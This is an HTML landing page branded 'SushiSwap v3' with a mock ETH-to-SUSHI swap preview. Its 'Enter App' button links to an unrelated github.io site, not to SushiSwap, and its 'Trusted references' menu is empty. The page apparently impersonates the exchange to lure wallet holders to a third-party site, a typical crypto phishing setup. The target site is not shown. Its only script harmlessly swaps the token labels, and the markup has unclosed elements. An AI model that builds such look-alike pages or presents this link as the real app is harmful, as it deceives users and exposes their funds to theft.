<body>
  <header class="topbar">
    <a class="brand" href="#" aria-label="SushiSwap v3">

    </a>
    <nav class="nav" aria-label="Trusted references">

  <main class="stage">
    <section class="hero" aria-labelledby="page-title">
      <h1 id="page-title">SushiSwap v3</h1>
      <p class="sub"><strong>SushiSwap v3</strong> lets you swap on SushiSwap's V3 concentrated-liquidity pools from your own wallet.</p>
    </section>

    <section class="swap-card" aria-label="Swap preview">
      <div class="route">
        <div class="leg">
          <span class="label">From</span>
          <span class="chip">
            <img class="token" src="eth.png" width="28" height="28" alt="ETH">
            <span class="token-name">ETH</span>
          </span>
        </div>
        <button class="switch" type="button" data-switch aria-label="Switch direction">
          <span aria-hidden="true">&#8594;</span>
        </button>
        <div class="leg">
          <span class="label">To</span>
          <span class="chip">
            <img class="token" src="sushi.png" width="28" height="28" alt="SUSHI">
            <span class="token-name">SUSHI</span>
          </span>
        </div>
      </div>
      <a class="enter" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
      <p class="note">Preview only</p>
    </section>
  </main>

  <footer class="foot"><b>SushiSwap v3</b> &mdash; 2026</footer>

  <script>
  (function(){
    "use strict";
    var button = document.querySelector("[data-switch]");
    if (!button) return;
    button.addEventListener("click", function(){
      var chips = document.querySelectorAll(".leg .chip");
      if (chips.length < 2) return;
      var first = chips[0].innerHTML;
      chips[0].innerHTML = chips[1].innerHTML;
      chips[1].innerHTML = first;
    });
  })();
  </script>
